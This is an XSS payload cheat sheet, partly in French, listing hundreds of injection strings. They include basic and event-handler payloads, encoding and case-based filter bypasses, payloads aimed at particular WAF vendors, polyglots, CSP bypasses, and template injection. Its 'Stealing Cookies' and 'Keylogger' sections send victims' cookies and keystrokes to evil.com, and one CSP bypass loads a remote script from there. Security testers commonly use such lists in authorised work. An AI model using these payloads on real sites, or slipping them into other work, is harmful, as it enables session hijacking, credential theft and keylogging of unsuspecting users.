## Basic XSS

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
```

## Event Handlers

```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
<video controls onloadstart=alert('XSS')><source src="validvideo.mp4" type="video/mp4"></video>
<audio controls onloadstart=alert('XSS')><source src="validaudio.mp3" type="audio/mpeg"></audio>
<details ontoggle=alert('XSS') open>
<marquee onstart=alert('XSS')>
```

## Sans Parentheses

```html
<script>alert`XSS`</script>
<script>eval.call`${'alert\x28document.domain\x29'}`</script>
<script>setTimeout`alert\x28document.domain\x29`</script>
<script>setInterval`alert\x28document.domain\x29`</script>
<script>Function`alert\x281\x29```</script>
```

## Bypass de filtre - (pas de script)

```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<object data=javascript:alert('XSS')>
<link rel=import href=javascript:alert('XSS')>
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
<form><button formaction=javascript:alert('XSS')>CLICK
```

## Bypass de filtre - MiNuscUlE/MaJusCuLe

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<script>ALERT('XSS')</script>
<ImG sRc=x OnErRoR=alert('XSS')>
<SVG ONload=alert('XSS')>
```

## Bypass de filtre - Sans quotes

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>
<script>alert`XSS`</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## Bypass de filtre - Encodé

```html
<!-- HTML Entities -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
&#60;script&#62;alert('XSS')&#60;/script&#62;
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;

<!-- URL Encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Unicode -->
<script>alert('\u0058\u0053\u0053')</script>
<script>alert('\x58\x53\x53')</script>

<!-- Hex -->
<script>alert(String.fromCharCode(0x58,0x53,0x53))</script>
```

## Bypass de filtre - Les espaces

```html
<img/src=x/onerror=alert('XSS')>
<img	src=x	onerror=alert('XSS')>
<img%09src=x%09onerror=alert('XSS')>
<img%0Asrc=x%0Aonerror=alert('XSS')>
<img%0Csrc=x%0Conerror=alert('XSS')>
<img%0Dsrc=x%0Donerror=alert('XSS')>
<img%20src=x%20onerror=alert('XSS')>
```

## Protocol Handlers

```html
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')">
<form action="javascript:alert('XSS')"><input type="submit">
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
```

## Data URLs

```html
<iframe src="data:text/html,<script>alert('XSS')</script>">
<object data="data:text/html,<script>alert('XSS')</script>">
<embed src="data:text/html,<script>alert('XSS')</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

## CSS Injection

```html
<style>@import'javascript:alert("XSS")';</style>
<link rel="stylesheet" href="javascript:alert('XSS')">
<style>body{background:url("javascript:alert('XSS')")}</style>
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert('XSS')"></div>
```

## SVG Payloads

```html
<svg onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>
<svg><script href=data:,alert('XSS') />
<svg><script xlink:href=data:,alert('XSS') />
<svg><use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert('XSS')</script></svg>#x"></use></svg>
```

## Polyglot Payloads

```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
```

## WAF Bypass

```html
<!-- Cloudflare -->
<svg onload=alert()>
<iframe srcdoc="&lt;svg onload&equals;alert&lpar;1&rpar;&gt;">

<!-- Akamai -->
<d3v onmouseover=alert(1)>
<details ontoggle=alert(1) open>

<!-- AWS WAF -->
<svg onload=%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x31%26%23x29>

<!-- Imperva -->
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29>
```

## Payloads spécifiques

### Inside HTML Attributes

```html
" onmouseover="alert('XSS')
' onmouseover='alert('XSS')
" autofocus onfocus="alert('XSS')
' autofocus onfocus='alert('XSS')
"} onmouseover="alert('XSS')
'} onmouseover='alert('XSS')
```

### Inside JavaScript Context

```html
</script><script>alert('XSS')</script>
';alert('XSS');//
';alert('XSS');/*
\';alert(\'XSS\');//
```

### Inside CSS Context

```html
</style><script>alert('XSS')</script>
*{color:red;background:url('javascript:alert(1)')}
```

## Advanced Payloads

### DOM XSS

```html
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<iframe src=javascript:eval(atob('YWxlcnQoMSk='))>
```

### Stealing Cookies

```html
<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>
<img src=x onerror=this.src='http://evil.com/?'+document.cookie>
<svg onload=fetch('http://evil.com/?cookie='+btoa(document.cookie))>
```

### Keylogger

```html
<script>document.onkeypress=function(e){fetch('http://evil.com/?key='+String.fromCharCode(e.which))}</script>
```

### Bypass CSP

```html
<!-- If 'unsafe-inline' is allowed -->
<script>alert('XSS')</script>

<!-- If external scripts allowed -->
<script src="http://evil.com/xss.js"></script>

<!-- JSONP callback -->
<script src="http://example.com/jsonp?callback=alert"></script>

<!-- If 'unsafe-eval' is allowed -->
<script>eval('alert(1)')</script>
```

## Mobile-Specific

```html
<!-- iOS Safari -->
<iframe src="x-apple-data-detectors://alert(1)">

<!-- Android -->
<iframe src="intent://alert(1)#Intent;scheme=javascript;end">
```

## File Upload XSS

```html
<!-- SVG File -->
<?xml version="1.0" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert('XSS')</script>
</svg>

<!-- HTML File -->
<!DOCTYPE html><html><head></head><body><script>alert('XSS')</script></body></html>

<!-- XML File -->
<?xml version="1.0"?><root><![CDATA[<script>alert('XSS')</script>]]></root>
```

## Template Injection to XSS

```html
<!-- Angular -->
{{constructor.constructor('alert(1)')()}}
{{7*7}}[[5*5]]
{{$eval.constructor('alert(1)')()}}

<!-- Vue.js -->
{{constructor.constructor('alert(1)')()}}

<!-- React -->
{7*7}
```

## Exotic Payloads

```html
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video src onloadstart=alert(1)>
<input type=image src onerror=alert(1)>
<isindex action=javascript:alert(1) type=image>
<form><button formaction="javascript:alert(1)">CLICK
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<li style=list-style:url() onload=alert(1)>
<div style="content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden" onload=alert(1)>
```